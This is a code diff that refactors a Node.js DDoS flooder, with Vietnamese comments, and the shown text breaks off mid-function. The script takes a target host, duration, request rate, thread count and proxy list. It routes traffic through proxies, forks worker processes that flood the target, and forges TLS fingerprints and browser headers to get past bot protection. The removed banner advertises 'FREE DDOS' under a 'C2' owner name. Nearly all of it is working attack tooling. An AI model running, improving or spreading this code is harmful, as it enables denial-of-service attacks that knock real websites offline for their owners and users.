@@ -1,19 +1,16 @@
 const net = require("net");
 const http2 = require("http2");
-const http = require('http');
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const dns = require('dns');
 const fetch = require('node-fetch');
 const util = require('util');
-const socks = require('socks').SocksClient;
+const http = require('http');
 const crypto = require("crypto");
-const HPACK = require('hpack');
 const fs = require("fs");
-const os = require("os");
-const colors = require("colors");
 
+// --- CẤU HÌNH BAN ĐẦU ---
 const JA3_PROFILES = {
     "chrome": {
         ciphers: "GREASE:TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384",
@@ -34,955 +31,227 @@ const JA3_PROFILES = {
         secureProtocol: ['TLSv1.3_method', 'TLSv1.2_method'],
     },
 };
-
 const BROWSER_PROFILES = {
     "chrome": {
-        platforms: ["Windows", "macOS", "Linux", "Android"],
+        platforms: ["Windows", "macOS", "Linux"],
         versions: { min: 120, max: 127 },
-        acceptEncodings: ["gzip, deflate, br, zstd", "gzip, deflate, br"],
-        acceptLanguages: ["en-US,en;q=0.9", "en;q=0.8", "vi-VN,vi;q=0.9,en-US;q=0.8"],
-        secFetchDests: ["document", "script", "image", "style", "font", "media", "manifest", "worker", "empty"],
-        secFetchModes: ["navigate", "cors", "no-cors", "same-origin"],
-        secFetchSites: ["same-origin", "same-site", "cross-site", "none"],
-        cacheControls: ["no-cache", "max-age=0", "no-store, must-revalidate"],
-        getSpecificHeaders: (browser, version, platform, isMobile, fullVersion) => ({
+        getSpecificHeaders: (version, platform, isMobile) => ({
             "sec-ch-ua": `"Google Chrome";v="${version}", "Chromium";v="${version}", "Not-A.Brand";v="99"`,
             "sec-ch-ua-mobile": isMobile ? "?1" : "?0",
             "sec-ch-ua-platform": `"${platform}"`,
-            "sec-ch-ua-platform-version": randomElement(platformVersions[platform]) || undefined,
-            "sec-ch-ua-arch": randomElement(architectures),
-            "sec-ch-ua-full-version-list": `"${browser.replace("mobile-", "")}";v="${fullVersion}", "Not-A.Brand";v="99.0.0.0"`,
-            "upgrade-insecure-requests": Math.random() < 0.8 ? "1" : undefined,
         })
     },
-    "firefox": {
-        platforms: ["Windows", "macOS", "Linux", "Android"],
-        versions: { min: 120, max: 130 },
-        acceptEncodings: ["gzip, deflate, br", "gzip, deflate"],
-        acceptLanguages: ["en-US,en;q=0.9", "en;q=0.8", "vi-VN,vi;q=0.9,en-US;q=0.8"],
-        secFetchDests: ["document", "script", "image", "style", "font", "media", "manifest", "worker", "empty"],
-        secFetchModes: ["navigate", "cors", "no-cors", "same-origin"],
-        secFetchSites: ["same-origin", "same-site", "cross-site", "none"],
-        cacheControls: ["no-cache", "max-age=0", "no-store, must-revalidate"],
-        getSpecificHeaders: (browser, version, platform, isMobile, fullVersion) => ({
-            "te": "trailers",
-            "upgrade-insecure-requests": Math.random() < 0.8 ? "1" : undefined,
-        })
-    },
-    "safari": {
-        platforms: ["macOS", "iOS"],
-        versions: { min: 17, max: 18 },
-        acceptEncodings: ["gzip, deflate, br"],
-        acceptLanguages: ["en-US,en;q=0.9", "en;q=0.8"],
-        secFetchDests: ["document", "script", "image", "style", "font", "media", "manifest", "worker", "empty"],
-        secFetchModes: ["navigate", "cors", "no-cors", "same-origin"],
-        secFetchSites: ["same-origin", "same-site", "cross-site", "none"],
-        cacheControls: ["no-cache", "max-age=0", "no-store, must-revalidate"],
-        getSpecificHeaders: (browser, version, platform, isMobile, fullVersion) => ({
-            "upgrade-insecure-requests": Math.random() < 0.8 ? "1" : undefined,
-        })
-    },
-    "edge": "chrome", "brave": "chrome", "opera": "chrome", "operagx": "chrome", "duckduckgo": "chrome",
-    "mobile-chrome": "chrome", "mobile-safari": "safari", "mobile-firefox": "firefox",
+    "firefox": { platforms: ["Windows", "macOS", "Linux"], versions: { min: 120, max: 128 }, getSpecificHeaders: () => ({ "te": "trailers" }) },
+    "safari": { platforms: ["macOS"], versions: { min: 16, max: 17 }, getSpecificHeaders: () => ({}) },
+    "mobile-chrome": { platforms: ["Android"], versions: { min: 120, max: 127 }, getSpecificHeaders: (version, platform, isMobile) => BROWSER_PROFILES.chrome.getSpecificHeaders(version, platform, isMobile) },
+    "mobile-safari": { platforms: ["iOS"], versions: { min: 16, max: 17 }, getSpecificHeaders: () => ({}) },
 };
 
-const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
-const ciphers = "GREASE:" + [
-    defaultCiphers[2],
-    defaultCiphers[1],
-    defaultCiphers[0],
-    ...defaultCiphers.slice(3)
-].join(":");
-
-function encodeSettings(settings) {
-    const data = Buffer.alloc(6 * settings.length);
-    settings.forEach(([id, value], i) => {
-        data.writeUInt16BE(id, i * 6);
-        data.writeUInt32BE(value, i * 6 + 2);
-    });
-    return data;
-}
-
-const urihost = [
-    'google.com', 'youtube.com', 'facebook.com', 'baidu.com', 'wikipedia.org',
-    'twitter.com', 'amazon.com', 'yahoo.com', 'reddit.com', 'netflix.com'
-];
-
-function encodeFrame(streamId, type, payload = "", flags = 0) {
-    const frame = Buffer.alloc(9 + payload.length);
-    frame.writeUInt32BE(payload.length << 8 | type, 0);
-    frame.writeUInt8(flags, 4);
-    frame.writeUInt32BE(streamId, 5);
-    if (payload.length > 0) frame.set(payload, 9);
-    return frame;
-}
-
-function getRandomInt(min, max) {
-    return Math.floor(Math.random() * (max - min + 1)) + min;
-}
-
-function randomIntn(min, max) {
-    return Math.floor(Math.random() * (max - min + 1)) + min;
-}
-
+// --- CÁC HÀM TIỆN ÍCH ---
+function randomIntn(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
 function randomElement(elements) {
+    if (!elements || elements.length === 0) return '';
     return elements[randomIntn(0, elements.length - 1)];
 }
 
-function randstr(length) {
-    const characters = "0123456789";
-    let result = "";
-    const charactersLength = characters.length;
-    for (let i = 0; i < length; i++) {
-        result += characters.charAt(Math.floor(Math.random() * charactersLength));
-    }
-    return result;
-}
-
-function generateRandomString(minLength, maxLength) {
-    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
-    const randomStringArray = Array.from({ length }, () => {
-        const randomIndex = Math.floor(Math.random() * characters.length);
-        return characters[randomIndex];
-    });
-    return randomStringArray.join('');
-}
-
-function randnum(minLength, maxLength) {
-    const characters = '0123456789';
-    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
-    const randomStringArray = Array.from({ length }, () => {
-        const randomIndex = Math.floor(Math.random() * characters.length);
-        return characters[randomIndex];
-    });
-    return randomStringArray.join('');
-}
-
-const cplist = [
-    "TLS_AES_128_CCM_8_SHA256",
-    "TLS_AES_128_CCM_SHA256",
-    "TLS_CHACHA20_POLY1305_SHA256",
-    "TLS_AES_256_GCM_SHA384",
-    "TLS_AES_128_GCM_SHA256"
-];
-var cipper = cplist[Math.floor(Math.random() * cplist.length)];
-
-const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
-const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
-
-process.on('uncaughtException', function(e) {
-    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
-}).on('unhandledRejection', function(e) {
-    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
-}).on('warning', e => {
-    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
-}).setMaxListeners(0);
-
+// --- CẤU HÌNH CHUNG & XỬ LÝ LỖI ---
+process.on('uncaughtException', () => {}).on('unhandledRejection', () => {}).setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
+const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED;
 
-const sigalgs = [
-    "ecdsa_secp256r1_sha256",
-    "rsa_pss_rsae_sha256",
-    "rsa_pkcs1_sha256",
-    "ecdsa_secp384r1_sha384",
-    "rsa_pss_rsae_sha384",
-    "rsa_pkcs1_sha384",
-    "rsa_pss_rsae_sha512",
-    "rsa_pkcs1_sha512"
-];
-let SignalsList = sigalgs.join(':');
-
-const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
-const secureOptions =
-    crypto.constants.SSL_OP_NO_SSLv2 |
-    crypto.constants.SSL_OP_NO_SSLv3 |
-    crypto.constants.SSL_OP_NO_TLSv1 |
-    crypto.constants.SSL_OP_NO_TLSv1_1 |
-    crypto.constants.ALPN_ENABLED |
-    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
-    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
-    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
-    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
-    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
-    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
-    crypto.constants.SSL_OP_SINGLE_DH_USE |
-    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
-    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
-
+// --- XỬ LÝ ĐẦU VÀO ---
 if (process.argv.length < 7) {
-    console.log(`Usage: node b.js <host> <time> <req> <thread> <proxy.txt>`);
+    console.log(`Usage: node <script_name>.js <host> <time> <req_per_ip> <thread> <proxy.txt>`);
     process.exit();
 }
-
 const args = {
     target: process.argv[2],
-    time: ~~process.argv[3],
-    Rate: ~~process.argv[4],
-    threads: ~~process.argv[5],
+    time: parseInt(process.argv[3]),
+    Rate: parseInt(process.argv[4]),
+    threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6],
 };
-
-var proxies = readLines(args.proxyFile);
+const proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/).filter(Boolean);
 const parsedTarget = url.parse(args.target);
 
+// --- LỚP KẾT NỐI PROXY ---
 class NetSocket {
-    constructor() {}
-
-    async SOCKS5(options, callback) {
-        const address = options.address.split(':');
-        socks.createConnection({
-            proxy: {
-                host: options.host,
-                port: options.port,
-                type: 5
-            },
-            command: 'connect',
-            destination: {
-                host: address[0],
-                port: +address[1]
-            }
-        }, (error, info) => {
-            if (error) {
-                return callback(undefined, error);
-            } else {
-                return callback(info.socket, undefined);
-            }
-        });
-    }
-
     HTTP(options, callback) {
-        const parsedAddr = options.address.split(":");
-        const addrHost = parsedAddr[0];
-        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
-        const buffer = new Buffer.from(payload);
-        const connection = net.connect({
-            host: options.host,
-            port: options.port,
+        const req = http.request({
+            host: options.host, port: options.port, method: 'CONNECT', path: `${options.address}:443`,
+            timeout: options.timeout * 1000, headers: { 'Connection': 'Keep-Alive', 'Host': options.address }
         });
-
-        connection.setTimeout(options.timeout * 100000);
-        connection.setKeepAlive(true, 100000);
-        connection.setNoDelay(true);
-
-        connection.on("connect", () => {
-            connection.write(buffer);
+        req.on('connect', (res, socket) => {
+            if (res.statusCode === 200) callback(socket, undefined);
+            else { socket.destroy(); callback(undefined, new Error(`Proxy responded with ${res.statusCode}`)); }
         });
-
-        connection.on("data", chunk => {
-            const response = chunk.toString("utf-8");
-            const isAlive = response.includes("HTTP/1.1 200");
-            if (isAlive === false) {
-                connection.destroy();
-                return callback(undefined, "error: invalid response from proxy server");
-            }
-            return callback(connection, undefined);
-        });
-
-        connection.on("timeout", () => {
-            connection.destroy();
-            return callback(undefined, "error: timeout exceeded");
-        });
+        req.on('timeout', () => req.destroy());
+        req.on('error', (err) => { req.destroy(); callback(undefined, err); });
+        req.end();
     }
 }
-
 const Socker = new NetSocket();
 
-function readLines(filePath) {
-    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
-}
-
-const lookupPromise = util.promisify(dns.lookup);
-let isp;
-let geoCountryCode = 'US';
-
+// --- LẤY THÔNG TIN ISP ---
+let isp = 'Unknown', geoCountryCode = 'US';
 async function getIPAndISP(url) {
     try {
-        const { address } = await lookupPromise(url);
-        const apiUrl = `http://ip-api.com/json/${address}`;
-        const response = await fetch(apiUrl);
+        const { address } = await util.promisify(dns.lookup)(url);
+        const response = await fetch(`http://ip-api.com/json/${address}`);
         if (response.ok) {
             const data = await response.json();
-            isp = data.isp;
-            geoCountryCode = data.countryCode;
+            isp = data.isp || 'Unknown';
+            geoCountryCode = data.countryCode || 'US';
         }
-    } catch (error) {}
+    } catch (error) { /* Bỏ qua lỗi */ }
 }
 
-const targetURL = parsedTarget.host;
-getIPAndISP(targetURL);
-
-const MAX_RAM_PERCENTAGE = 85;
-const RESTART_DELAY = 1000;
-
-function getRandomHeapSize() {
-    const min = 1000;
-    const max = 5222;
-    return Math.floor(Math.random() * (max - min + 1)) + min;
-}
-
+// --- CẤU HÌNH CLUSTER ---
 if (cluster.isMaster) {
     console.clear();
-    console.clear()
-    console.log('\x1b[38;2;243;12;255m╔═════════════╦[+]║Attack \x1b[38;5;55mSent║[+]╦═════════════╗\x1b[0m');
-    console.log(`\x1b[1;36m  [Target]   : \x1b[38;5;55m${process.argv[2]}\x1b[0m`);
-    console.log(`\x1b[1;36m  [proxy]    : ${process.argv[6]}\x1b[38;5;55m   || Total: ${proxies.length.toString()}`);
-    console.log(`\x1b[1;36m  [Duration] : \x1b[38;5;55m${process.argv[3]} seconds\x1b[0m`);
-    console.log(`\x1b[1;36m  [Rate]     : \x1b[38;5;55m${process.argv[4]} req/s\x1b[0m`);
-    console.log(`\x1b[1;36m  [Threads]  : \x1b[38;5;55m${process.argv[5]}\x1b[0m`);
-    console.log(`\x1b[1;36m  [Owner]    : \x1b[38;5;55m KRUNO C2 👑 \x1b[0m`);
-    console.log('\x1b[38;2;243;12;255m╚═════════════╩[+]║FREE \x1b[38;5;55mDDOS║[+]╩═════════════╝\x1b[0m');
+    console.log('╔══════════════════════════════════════════════════╗');
+    console.log(`  Target: ${args.target}`);
+    console.log(`  Time: ${args.time}s | Threads: ${args.threads} | Requests/IP: ${args.Rate}`);
+    console.log(`  Proxies: ${args.proxyFile} (${proxies.length})`);
 
-    const restartScript = () => {
-        for (const id in cluster.workers) {
-            cluster.workers[id].kill();
+    let totalStatusCounts = {}; // **NEW**: Biến tổng hợp status code
+
+    (async () => {
+        await getIPAndISP(parsedTarget.host);
+        console.log(`  ISP: ${isp} | Country: ${geoCountryCode}`);
+        console.log('╚══════════════════════════════════════════════════╝');
+        
+        for (let i = 0; i < args.threads; i++) {
+            const worker = cluster.fork({ ISP: isp, GEO: geoCountryCode });
+            // **NEW**: Lắng nghe status code từ worker
+            worker.on('message', (msg) => {
+                if (msg.statusCode) {
+                    totalStatusCounts[msg.statusCode] = (totalStatusCounts[msg.statusCode] || 0) + 1;
+                }
+            });
         }
-        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
-        setTimeout(() => {
-            for (let counter = 1; counter <= args.threads; counter++) {
-                const heapSize = getRandomHeapSize();
-                cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
-            }
-        }, RESTART_DELAY);
-    };
+    })();
 
-    const handleRAMUsage = () => {
-        const totalRAM = os.totalmem();
-        const usedRAM = totalRAM - os.freemem();
-        const ramPercentage = (usedRAM / totalRAM) * 100;
-        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
-            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
-            restartScript();
+    // **NEW**: Hiển thị báo cáo tổng hợp mỗi 3 giây
+    const logInterval = setInterval(() => {
+        if (Object.keys(totalStatusCounts).length > 0) {
+            process.stdout.write(`\r[STATS] Total Status Codes: ${JSON.stringify(totalStatusCounts)}   `);
         }
-    };
+    }, 3000);
 
-    setInterval(handleRAMUsage, 5000);
+    setTimeout(() => {
+        console.log('\n[INFO] Attack finished.');
+        clearInterval(logInterval);
+        process.exit(0);
+    }, args.time * 1000);
 
-    for (let counter = 1; counter <= args.threads; counter++) {
-        const heapSize = getRandomHeapSize();
-        cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
-    }
-} else {
-    setInterval(runFlooder, 1);
+} else { // Worker process
+    isp = process.env.ISP;
+    geoCountryCode = process.env.GEO;
+    setInterval(runFlooder);
 }
 
-const HEADER_MAPS = {
-    "chrome": {
-        ":method": "GET",
-        ":scheme": "https",
-        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "accept-encoding": "gzip, deflate, br, zstd",
-        "accept-language": "en-US,en;q=0.9",
-        "sec-fetch-dest": "document",
-        "sec-fetch-mode": "navigate",
-        "sec-fetch-site": "same-origin",
-        "sec-fetch-user": "?1",
-        "upgrade-insecure-requests": "1",
-        "dnt": "1",
-    },
-    "firefox": {
-        ":method": "GET",
-        ":scheme": "https",
-        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "accept-encoding": "gzip, deflate, br",
-        "accept-language": "en-US,en;q=0.5",
-        "sec-fetch-dest": "document",
-        "sec-fetch-mode": "navigate",
-        "sec-fetch-site": "same-origin",
-        "te": "trailers",
-        "upgrade-insecure-requests": "1",
-    },
-    "safari": {
-        ":method": "GET",
-        ":scheme": "https",
-        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "accept-encoding": "gzip, deflate, br",
-        "accept-language": "en-US,en;q=0.9",
-        "sec-fetch-dest": "document",
-        "sec-fetch-mode": "navigate",
-        "sec-fetch-site": "same-origin",
-        "upgrade-insecure-requests": "1",
-    },
-    "mobile-chrome": {
-        ":method": "GET",
-        ":scheme": "https",
-        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "accept-encoding": "gzip, deflate, br",
-        "accept-language": "en-US,en;q=0.9",
-        "sec-fetch-dest": "document",
-        "sec-fetch-mode": "navigate",
-        "sec-fetch-site": "same-origin",
-        "sec-fetch-user": "?1",
-        "upgrade-insecure-requests": "1",
-        "dnt": "1",
-    },
-    "mobile-safari": {
-        ":method": "GET",
-        ":scheme": "https",
-        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "accept-encoding": "gzip, deflate, br",
-        "accept-language": "en-US,en;q=0.9",
-        "sec-fetch-dest": "document",
-        "sec-fetch-mode": "navigate",
-        "sec-fetch-site": "same-origin",
-        "upgrade-insecure-requests": "1",
-    },
-    "mobile-firefox": {
-        ":method": "GET",
-        ":scheme": "https",
-        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "accept-encoding": "gzip, deflate, br",
-        "accept-language": "en-US,en;q=0.5",
-        "sec-fetch-dest": "document",
-        "sec-fetch-mode": "navigate",
-        "sec-fetch-site": "same-origin",
-        "te": "trailers",
-        "upgrade-insecure-requests": "1",
-    },
-    "edge": "chrome",
-    "brave": "chrome",
-    "opera": "chrome",
-    "operagx": "chrome",
-    "duckduckgo": "chrome",
-};
-
-const browsers = ["chrome", "safari", "firefox", "edge", "brave", "opera", "operagx", "duckduckgo", "mobile-chrome", "mobile-safari", "mobile-firefox"];
-const platformVersions = {
-    "Windows": ["10.0", "11.0"],
-    "macOS": ["10.15.7", "11.6", "12.0", "13.0", "14.0"],
-    "Linux": [undefined],
-    "Android": ["10.0", "11.0", "12.0", "13.0", "14.0"],
-    "iOS": ["15.0", "16.0", "17.0", "18.0"]
-};
-const architectures = ["x86", "arm64", "arm"];
-
-const referers = [
-    "https://www.google.com/", "https://www.bing.com/", "https://www.yahoo.com/",
-    "https://www.youtube.com/", "https://www.reddit.com/", "https://www.twitter.com/",
-    "https://www.facebook.com/", "https://www.instagram.com/", "https://www.tiktok.com/",
-    "https://www.linkedin.com/", "https://www.quora.com/", "https://news.ycombinator.com/",
-    "https://www.wikipedia.org/", "https://www.amazon.com/", "https://www.ebay.com/"
-];
-const origins = [
-    "https://www.google.com", "https://www.youtube.com", "https://www.reddit.com",
-    "https://www.twitter.com", "https://www.facebook.com", "https://www.instagram.com",
-    "https://www.tiktok.com", "https://www.linkedin.com", "https://www.amazon.com"
-];
-
+// --- LOGIC TẠO HEADER & DANH TÍNH ---
+const platformVersions = { "Windows": ["10.0", "11.0"], "macOS": ["13.0", "14.0"], "Linux": ["5.15.0"], "Android": ["12.0", "13.0"], "iOS": ["16.0", "17.0"] };
+const referers = ["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/"];
 const resourcePaths = [
-    { path: parsedTarget.path, dest: "document" },
-    { path: '/assets/css/style.css', dest: "style" },
-    { path: '/assets/js/main.js', dest: "script" },
-    { path: '/images/logo.png', dest: "image" },
-    { path: '/favicon.ico', dest: "image" },
-    { path: '/about', dest: "document" },
-    { path: '/contact', dest: "document" },
-    { path: '/blog/post-123', dest: "document" },
-    { path: '/api/data', dest: "empty" },
-    { path: '/search?q=test', dest: "document" },
-    { path: '/products/category/item', dest: "document" },
+    { path: '/css/style.css', dest: "style", accept: "text/css,*/*;q=0.1" },
+    { path: '/js/main.js', dest: "script", accept: "*/*" },
+    { path: '/img/logo.png', dest: "image", accept: "image/avif,image/webp,*/*;q=0.8" },
 ];
 
-
-function getRandomBrowser() {
-    const weights = {
-        "chrome": 0.40, "mobile-chrome": 0.25, "safari": 0.15, "mobile-safari": 0.10,
-        "firefox": 0.05, "mobile-firefox": 0.02, "edge": 0.01, "brave": 0.01,
-        "opera": 0.005, "operagx": 0.005, "duckduckgo": 0.005
-    };
-    const total = Object.values(weights).reduce((a, b) => a + b, 0);
-    const rand = Math.random() * total;
-    let sum = 0;
-    for (const browser in weights) {
-        sum += weights[browser];
-        if (rand <= sum) return browser;
+function createIdentity() {
+    const browser = randomElement(Object.keys(BROWSER_PROFILES)), profile = BROWSER_PROFILES[browser], version = randomIntn(profile.versions.min, profile.versions.max);
+    const platform = randomElement(profile.platforms), isMobile = browser.startsWith('mobile'), fullVersion = `${version}.0.${randomIntn(1000, 6000)}.${randomIntn(10, 200)}`;
+    let userAgent;
+    switch (browser) {
+        case 'firefox': userAgent = `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions.Windows)}` : `X11; ${platform} x86_64`}; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`; break;
+        case 'safari': userAgent = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/605.1.15`; break;
+        case 'mobile-safari': userAgent = `Mozilla/5.0 (iPhone; CPU iPhone OS ${randomElement(platformVersions.iOS).replace('.', '_')} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Mobile/15E148 Safari/604.1`; break;
+        default: userAgent = `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions.Windows)}` : isMobile ? `Linux; Android ${randomElement(platformVersions.Android)}` : `X11; ${platform} x86_64`}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} ${isMobile ? 'Mobile ' : ''}Safari/537.36`; break;
     }
-    return "chrome";
+    const ja3Key = browser.replace('mobile-', '');
+    return { userAgent, baseHeaders: { "user-agent": userAgent, "accept-language": `en-US,en;q=0.9,${geoCountryCode.toLowerCase()};q=0.8`, "upgrade-insecure-requests": "1", ...profile.getSpecificHeaders(version, platform, isMobile) }, ja3Profile: JA3_PROFILES[ja3Key] };
 }
 
-function uapick(browser, version, platform, isMobile, fullVersion) {
-    const userAgents = {
-        "chrome": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64` : platform === "macOS" ? `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}` : platform === "Linux" ? "X11; Linux x86_64" : `Linux; Android ${randomElement(platformVersions["Android"])}`}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36`,
-        "safari": `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}_1) AppleWebKit/605.1.${Math.floor(Math.random() * 20)} (KHTML, like Gecko) Version/${version}.0 Safari/605.1.${Math.floor(Math.random() * 20)}`,
-        "firefox": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64` : platform === "macOS" ? `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}` : platform === "Linux" ? "X11; Linux x86_64" : `Android ${randomElement(platformVersions["Android"])}; Mobile`}) Gecko/20100101 Firefox/${version}.0`,
-        "edge": `Mozilla/5.0 (Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 Edg/${fullVersion}`,
-        "brave": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64` : platform === "macOS" ? `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}` : "X11; Linux x86_64"}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 Brave/${version}`,
-        "opera": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64` : platform === "macOS" ? `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}` : "X11; Linux x86_64"}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 OPR/${version}.0.0.0`,
-        "operagx": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64` : `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}`}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 OPR/${version}.0.0.0 (Edition GX)`,
-        "duckduckgo": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64` : platform === "macOS" ? `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}` : `Linux; Android ${randomElement(platformVersions["Android"])}`}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 DuckDuckGo/${version}`,
-        "mobile-chrome": `Mozilla/5.0 (Linux; Android ${randomElement(platformVersions["Android"])}; ${["Pixel", "Samsung", "Xiaomi", "OnePlus"][Math.floor(Math.random() * 4)]} ${Math.floor(6 + Math.random() * 4)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Mobile Safari/537.36`,
-        "mobile-safari": `Mozilla/5.0 (iPhone; CPU iPhone OS ${randomElement(platformVersions["iOS"])} like Mac OS X) AppleWebKit/605.1.${Math.floor(Math.random() * 20)} (KHTML, like Gecko) Version/${version}.0 Mobile/15E148 Safari/604.1`,
-        "mobile-firefox": `Mozilla/5.0 (Android ${randomElement(platformVersions["Android"])}; Mobile; rv:${version}.0) Gecko/${version}.0 Firefox/${version}.0`
-    };
-    return userAgents[browser];
-}
-
-function headersArrayToObject(headersArray) {
-    const headersObject = {};
-    headersArray.forEach(([key, value]) => {
-        if (value !== undefined) {
-            headersObject[key] = value;
-        }
-    });
-    return headersObject;
-}
-
-const headerFunc = (parsedTarget, browser, version, platform, isMobile, fullVersion, geoCountryCode) => {
-    let profile = BROWSER_PROFILES[browser];
-    if (typeof profile === 'string') {
-        profile = BROWSER_PROFILES[profile];
-    }
-
-    const acceptLanguagesMap = {
